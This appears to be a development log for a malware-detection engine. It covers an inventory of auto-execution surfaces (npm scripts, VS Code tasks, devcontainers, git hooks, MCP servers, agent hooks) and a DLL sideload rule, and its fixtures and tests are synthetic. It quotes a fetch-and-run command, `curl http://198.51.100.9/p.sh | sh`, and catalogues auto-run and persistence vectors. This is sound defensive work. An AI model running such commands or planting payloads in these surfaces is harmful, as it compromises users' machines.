# Coverage Wave 6 Log: What Runs Automatically, and What It Loads

Date: 2026-11-24 (built overnight 2026-11-24 to 2026-11-25).
Scope: items 3, 4 and 6 of the next-frontier research
(`~/workspace/research_notes/event-zero-next-frontier-20261124/report.md`,
sections 2.3, 2.4 and 2.8, the ranked items 3, 4 and 6, and the
wave 6 repricing in section 1): the auto-execution inventory
by effect, workspace and agent configuration as script units,
and the sideload composite rule. Method: synthetic fixtures
only, built in the test file from the format specifications.
No sample was downloaded. Prior behaviour was proven by probe
before any code changed (see each section).

Code: new module `event_zero/coverage6.py` carries the
inventory (the trigger catalogue, one detector per surface,
and the command analysis that decides which local files and
remote content a unit names) and the PE import and
delay-import parse. `event_zero/verdict.py` wires it in two
places: a per-file section in the coverage wave 3 and 5 style
(named blockers on the file's own record, units recorded on
`rec["autoexec"]`, every unit also summarised in the result's
`autoexec_inventory`), and a post-loop folder-level pass for
the sideload composite, styled on the coverage wave 2
bytecode reconciliation pass and placed after the DLL
sideload triad pass whose general case it is. The exemptions
mirror waves 1 to 3: byte identity (hash match or a strong
manifest hash) does not depend on the inventory, and a failed
container is already capped as a unit. A fully enumerated
container is not exempt: a configuration file inside an
archive is judged on its own record like any other member.
No new conviction paths: every wave 6 cap is an accounting
cap (YES: UNACCOUNTED) or a blocker on a record a chain
already convicted, except where an existing family standard
already applies to the judged unit itself (a unit command
that is itself a fetch-and-execute chain is named by the
existing script-class finding, as a blocker, in the wave 2
style).

Diagnosis note: the probe PE builder first used for item 6
packed section raw data back to back, unaligned. pefile
adjusts a section's raw pointer down to the file alignment
when it maps RVAs, so it read the import table from the wrong
offset and produced structural warnings, and the wave 3
dual-parser gate capped the probe hosts on parser warnings
before any composite question arose. The wave 3 test builder
has the same layout and the same pefile behaviour; its
verdict-level import fixtures pass because they are judged
under byte identity or cap for other reasons. The wave 6
builder aligns section raw pointers to the file alignment
(0x200) the way a real linker lays them out, and with that
layout pefile and LIEF both read the import and delay-import
tables cleanly and the dual-parser gate is silent, so the
composite rule is the deciding factor in the item 6 tests.

## Item 3: auto-execution inventory by effect

Prior behaviour (proven by probe): the engine had no
inventory. Surfaces whose raw text happens to contain a
capability chain were convicted by the text machinery with
the trigger nowhere named (an npm postinstall running
`curl http://198.51.100.9/p.sh | sh`, a binding.gyp action
doing the same, a .pth line running os.system on a fetch, a
VS Code folderOpen task, a devcontainer postCreateCommand, a
Claude settings SessionStart hook, a git post-checkout hook,
an .envrc, and an MCP server definition whose args run
`sh -c` on a fetch all reached YES by chain). Every other
shape passed silently at NO ACCOUNTED, including shapes whose
entire behaviour is automatic: a package.json git-URL
dependency (the dependency's own prepare hook runs at
install, over content that is not in the submission), an npm
postinstall naming an absent local script, a package.json bin
entry naming an absent file, a .pth whose only line imports a
module absent from the submission, a VS Code folderOpen task
naming an absent script, and every unaccounted-local-command
shape in item 4 below.

Built: `coverage6.autoexec_units` returns, per file, the
units the file declares, each with its trigger named. The
verdict judges each unit's commands with the existing
machinery composed for exactly this purpose: the resolved
source's script-class findings, the interpreter-proxy
findings, and the external-reference closure (R1 dispositions
applied to the command text), plus the unit's own structured
references: a remote target (a git or tarball dependency, a
remote MCP server, a package a package-execution tool such as
npx or uvx would fetch and run) caps; a local target that is
not part of the submission caps; a .pth import of a module
that is neither in the standard library nor in the submission
caps. A trigger class the catalogue does not recognise, in a
file whose format claims an auto-execution surface, caps
with the trigger named (the unrecognised-trigger rule is
applied where the format has a closed trigger vocabulary:
devcontainer lifecycle keys, VS Code task runOn values, and
agent hook event names). A surface file that cannot be
parsed caps as unaccounted rather than passing as inert.

Judgement calls, stated: package installation commands that
populate an environment from a registry under lockfile
discipline (pip install, npm install, apt-get install) are
recorded in a unit's commands and judged as text, but are not
by themselves remote targets; the remote-target rule fires
on named remote code sources (a URL, a git or tarball
dependency, a remote server, a package fetched to be run as
the command). Interpreter modules named after -m are recorded
on the unit, not capped: they name installed packages outside
the submission boundary, and the standard Jupyter kernel
specification (python -m ipykernel_launcher) must keep its
path. Absolute machine paths in commands are machine-local
content, the same disposition the reference closure gives
local targets.

## Item 4: workspace and agent configuration as script units

Prior behaviour (proven by probe): configuration files were
judged as text. A kernel.json whose argv names an absent
launcher.py, an MCP configuration whose server command names
an absent server.py, a tasks.json folderOpen task naming an
absent ./setup.sh, a tasks.json with an invented runOn value
("workspaceLoad") carrying a command, a devcontainer.json
with an invented lifecycle key ("postCloneCommand") carrying
a command, and a Claude settings file with hooks under an
invented event ("OnMagic") carrying a command all reached
NO ACCOUNTED. The controls that keep NO today and still keep
it: a kernel spec for a standard interpreter, an MCP
definition pointing at a present local script, a .pth
containing only a path line, a benign git hook, a benign
sitecustomize.py, a tasks file running a local build.

Built: the surfaces are detected by name and by content, and
each configuration's commands are judged as script units
under the closure rules with the trigger named on the
record: VS Code tasks (runOn folderOpen) and launch
configurations (the program and arguments, with
workspace-variable prefixes resolved to workspace-relative
paths), devcontainer lifecycle commands in all three value
forms (string, argv array, named-command map), Jupyter
kernel.json argv, git hooks present in a submission tree (a
hooks, .githooks or .husky directory, or a .git tree, by hook
name, excluding the inert .sample files; the hook file's own
text is judged as the unit), npm and Composer configuration
and manifests naming install-time commands (lifecycle
scripts, bin shims, local and git dependencies, .npmrc
onload-script), and agent and MCP configuration (any JSON
file whose top level names MCP servers with a command and
args, or a remote server URL, and agent settings files whose
hooks map event names to commands). The fetch-execute
composition caps in a configuration exactly as it caps in a
script file, because the composition functions are the same
ones.

## The trigger catalogue as built

A maintained list, not a finished one. Adding a surface or a
trigger is a catalogue edit in `coverage6.py` plus a test.

- Package install, npm: lifecycle scripts preinstall,
  install, postinstall, prepare, prepublish, prepublishOnly,
  prepack, postpack, preuninstall, postuninstall (trigger:
  package install). Bin entries (trigger: command shim).
  Dependencies by spec: git and tarball specs (trigger:
  package install, git dependency prepare), file: specs
  (local dependency).
- Package install, Composer: the *-cmd lifecycle events in
  COMPOSER_INSTALL_TRIGGERS (trigger: package install).
- Native build: binding.gyp (trigger: native build, node-gyp,
  at package install; its actions are command units). Cargo
  build.rs (trigger: native build, Cargo build script).
  Python pyproject.toml build-system (trigger: python build,
  PEP 517 build backend; a backend-path names local code).
- Install and build execution: setup.py (trigger: package
  install and build, setup.py execution; the file is judged
  as a script on its own record).
- Interpreter start: .pth import lines (trigger: interpreter
  start, site .pth); sitecustomize.py and usercustomize.py
  (trigger: interpreter start, site customization).
- Folder open: VS Code tasks with runOn folderOpen (trigger:
  folder open). Directory enter: .envrc (trigger: directory
  enter, direnv; the file's text is the unit).
- Debug start: VS Code launch configurations (trigger: debug
  start).
- Container lifecycle: devcontainer initializeCommand,
  onCreateCommand, updateContentCommand, postCreateCommand,
  postStartCommand, postAttachCommand (trigger: container
  lifecycle, key named). Any other *Command key carrying a
  command is an unrecognised trigger.
- Kernel start: Jupyter kernel.json argv (trigger: kernel
  start).
- Repository events: git hooks by name in GIT_HOOKS
  (trigger: git hook, name named).
- Package manager load: .npmrc onload-script (trigger:
  package manager load).
- Agent session start: MCP server definitions, stdio form
  (command and args) and remote form (URL) (trigger: agent
  session start, MCP server launch). Agent hooks by event
  name in AGENT_HOOK_EVENTS (trigger: agent hook, event
  named); an event outside the set carrying commands is an
  unrecognised trigger.
- Logon and service start: launchd plists with a program and
  RunAtLoad, KeepAlive, or a LaunchAgents or LaunchDaemons
  location (trigger: logon or service start, launchd);
  systemd units' ExecStart, ExecStartPre and ExecStartPost
  (trigger: service start, systemd).

## Item 6: sideload composite rule

Prior behaviour (proven by probe): the only folder-level
loading rule was the sideload triad (a signed executable, an
unsigned same-name DLL that is not the genuine file, and an
encrypted sidecar, convicted as a family). The general case
had no rule: a signed host importing a same-folder DLL that
was unaccounted was judged per file, so the host's own record
could read NO ACCOUNTED (byte-identical to the genuine
reference, or signature-verified) while the unit it loads by
name was unaccounted, and the loading relationship was named
nowhere. A delay import was not read at all (the engine's
detailed PE parse had no delay-import walk). An import
naming a library absent from the folder was recorded
nowhere.

Built: `coverage6.pe_imports` returns a PE's import and
delay-import library names (the internal detailed parse for
imports, plus a delay-directory walk added here). Every PE's
imports are stashed on its record in the per-file loop,
outside the reference gate, because a genuine signed host is
exactly the shape the rule exists for. After the triad pass,
the composite pass groups the release by folder (the triad
pass's grouping) and, for each signed host that is not itself
a DLL or driver, resolves every import and delay import
against the same folder: a same-folder unit that is
accounted records the pair as accounted on the host's record
(`rec["sideload"]`); a same-folder unit that is not accounted
caps the pair, flipping the host's record to YES:
UNACCOUNTED when it read NO, with a blocker naming the host,
the library, the import kind, the loaded file, and the rule
that the host's signature covers the host only. An import
that resolves to no same-folder file and is not a known
system library (the SYSTEM_DLLS catalogue, plus the api-ms
and ext-ms API-set prefixes) is recorded on the host's record
as an unresolved import with a note in its why list; the
host alone is not capped for an absent import. The benign
control is a signed host whose same-folder libraries are all
signed or accounted (by signature or by byte identity), and
it keeps NO with the pairs recorded as accounted.

## Tests

`tests/test_coverage_wave6.py`, 36 tests, synthetic fixtures
only: module-level inventory and import-parse tests, and
verdict-level positives and controls per item as listed in
the test file. No existing test was changed. Full suite in
`~/ezpush-venv`: baseline re-verified at 366 passed before
the wave's code landed, and 402 passed after it (366
baseline intact plus the 36 new tests), zero failures; the
intermittently state-sensitive
`tests/test_final.py::test_export_cli` passed in the full
run, so no standalone re-run was needed. No disk quota
errors appeared in this session, so no staging copy was
needed. Nothing was committed or pushed; the operator
pushes on verification under the standing authorization.

## Remainder (named, not silently dropped)

- The trigger catalogue is a subscription, not a finish: new
  agent hook events, new editor surfaces, and new package
  manager hooks land upstream faster than any static list.
  The unrecognised-trigger caps bound the damage for the
  three closed-vocabulary formats; formats with open
  vocabularies (npm script keys are the standing example)
  cannot cap on novelty alone without capping every custom
  script name, so their unlisted keys are inventoried only
  when the key is a known lifecycle event.
- Package.json and other manifests under a node_modules
  component are not inventoried: a vendored tree's own
  manifests are the dependency's units, and the submission's
  top-level manifest is where the install decision is made.
  A submission that is itself a node_modules tree would need
  the exclusion revisited.
- Local-target resolution is by basename against the whole
  submission, the same approximation the reference closure
  uses: a unit naming a file that exists elsewhere in the
  tree under the same name resolves, even if the runtime
  would look in the unit's own folder first.
- Shell command analysis reads the command's program token,
  interpreter arguments, and package-execution tools. It does
  not resolve variables, subshells, or commands built by
  concatenation inside a configuration value; the script
  machinery's resolved-source pass applies to script files,
  and extending it to configuration values is future work.
- The composite rule is PE only. Mach-O hosts loading
  same-folder dylibs through @rpath, and ELF hosts with an
  RPATH into the folder, are the same shape on other
  platforms and are not covered; the triad pass already
  names dylib members, but no import-resolution composite
  exists for them.
- The composite judges the pair (host, directly loaded
  unit). A loaded unit that itself loads a further
  unaccounted unit caps on its own record if it is a signed
  host, but transitive loading chains are not composed into
  one finding.
- launchd and systemd units are inventoried conservatively:
  absolute program paths are machine-local and recorded in
  the command text only, so a service unit whose payload is
  an absolute path into the submission's own tree is not
  resolved against the tree.
- Scheduled surfaces declared in formats the engine does not
  parse (cron spool files by content, Windows Task Scheduler
  XML, registry Run keys inside .reg files) are not
  inventoried; the catalogue covers the statically declared
  surfaces in the formats the engine already reads.
